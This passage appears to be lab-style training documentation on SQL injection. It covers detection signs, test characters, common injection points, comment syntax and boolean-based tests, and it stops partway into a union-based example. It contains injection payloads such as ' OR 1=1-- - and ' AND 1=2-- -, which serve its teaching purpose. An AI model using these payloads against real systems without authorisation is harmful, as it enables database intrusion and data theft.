  • Unexpected empty or full result sets
  • Time delays after sleep payloads
  • Different HTTP status codes
  • Different content length
  • Database-specific error text

Example test characters:

'
"
`
')
")

Note

Error messages are helpful in labs, but real applications may suppress errors. SQLi can still exist without visible errors.

docs.title: Common Injection Points
docs.text:
SQLi can appear anywhere user input reaches a database query.

Common locations:

Location Example URL query parameters /product?id=1 POST body username=alice&password=test JSON API body { "id": 1 } Cookies TrackingId=abc123 HTTP headers User-Agent, X-Forwarded-For Search fields /search?q=laptop Sort parameters sort=price Filters category=books

docs.title: SQL Comments
docs.text:
Comments are often used to ignore the rest of the original query.

Common SQL comment styles:

Syntax Notes -- Common SQL comment -- - Often used to ensure spacing # MySQL comment /* comment */ Inline block comment

Example:

' OR 1=1-- -

docs.title: Boolean-Based SQLi
docs.text:
Boolean-based SQLi checks whether true and false conditions change the response.

Example true condition:

' AND 1=1-- -

Example false condition:

' AND 1=2-- -

If the page behaves differently, the input may be injectable.

docs.title: Union-Based SQLi
docs.text:
UNION can combine results from another query into the original response.

Conceptual example:

SELECT name, price FROM products WHERE category = 'books'
UNION
